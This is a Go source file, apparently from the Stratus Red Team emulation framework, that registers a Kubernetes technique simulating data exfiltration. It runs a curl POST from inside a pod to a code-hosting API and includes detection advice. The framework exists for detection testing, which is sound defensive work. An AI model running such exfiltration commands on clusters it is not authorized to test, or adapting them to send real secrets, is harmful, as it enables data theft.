package kubernetes

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"sort"
	"strings"
	"time"

	"github.com/datadog/stratus-red-team/v2/internal/utils/kubernetes"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const techniqueID = "k8s.exfiltration.connect-code-hosting"

type CodeHosting string

const (
	GitHub    CodeHosting = "github"
	GitLab    CodeHosting = "gitlab"
	Bitbucket CodeHosting = "bitbucket"
	Gitea     CodeHosting = "gitea"
	Codeberg  CodeHosting = "codeberg"
)

var codeHostingURLs = map[CodeHosting]string{
	GitHub:    "https://api.github.com",
	GitLab:    "https://gitlab.com/api/v4",
	Bitbucket: "https://api.bitbucket.org/2.0",
	Gitea:     "https://gitea.com/api/v1",
	Codeberg:  "https://codeberg.org/api/v1",
}

func supportedCodeHostingPlatforms() string {
	var platforms []string
	for platform := range codeHostingURLs {
		platforms = append(platforms, string(platform))
	}
	sort.Strings(platforms)
	return strings.Join(platforms, ", ")
}

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 techniqueID,
		FriendlyName:       "Connect to Code Hosting Platform from Pod",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		Description: `
Connects to a code hosting platform from within a pod.
This simulates an attacker attempting to exfiltrate code or access repositories.

Warm-up:

- Create the Stratus Red Team namespace
- Create a Pod

Detonation:

- Execute a curl POST request in the pod to a code hosting platform API (simulating data exfiltration)
- The request will fail (no authentication), but the network connection is made
- Supported platforms: ` + supportedCodeHostingPlatforms() + `
`,
		Detection: `
Monitor for:
- Outbound connections to code hosting platforms (github.com, gitlab.com, bitbucket.org, ...)
- DNS queries for these domains from pods that shouldn't need them
`,
		PrerequisitesTerraformCode: tf,
		PodConfigViaTerraform:      true,
		Detonate:                   detonate,
	})
}

// TODO: Implement TTP variation
func detonate(params map[string]string, providers stratus.CloudProviders) error {
	return detonateWithOptions(params, providers, GitHub)
}

func detonateWithOptions(params map[string]string, providers stratus.CloudProviders, platform CodeHosting) error {
	config := providers.K8s().GetRestConfig()
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	podName := params["pod_name"]

	url, ok := codeHostingURLs[platform]
	if !ok {
		return fmt.Errorf("unknown code hosting platform: %s", platform)
	}

	log.Printf("Connecting to code hosting platform: %s", platform)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	cmd := []string{
		"curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
		"-X", "POST",
		"-H", "User-Agent: stratus-red-team",
		"-H", "Content-Type: application/json",
		"-d", `{"stratus-red-team": "exfiltration-test"}`,
		url,
	}

	stdout, stderr, err := kubernetes.ExecInPod(ctx, config, client, namespace, podName, "", cmd)
	if err != nil {
		return fmt.Errorf("failed to connect to code hosting platform: %w (stderr: %s)", err, stderr)
	}

	log.Printf("Connection to %s completed with HTTP status: %s", platform, stdout)
	return nil
}
